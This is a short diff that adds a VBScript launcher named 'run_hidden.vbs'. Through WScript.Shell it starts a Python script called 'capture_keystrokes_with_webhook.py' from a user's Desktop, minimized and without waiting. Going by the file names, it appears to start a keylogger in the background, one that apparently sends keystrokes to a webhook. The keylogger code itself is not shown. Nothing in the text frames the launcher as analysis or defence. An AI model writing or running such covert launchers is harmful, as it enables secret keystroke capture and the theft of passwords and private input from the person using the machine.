@@ -1,0 +1,3 @@
+' run_hidden.vbs
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "python C:\Users\hooke\Desktop\capture_keystrokes_with_webhook.py", 7, False
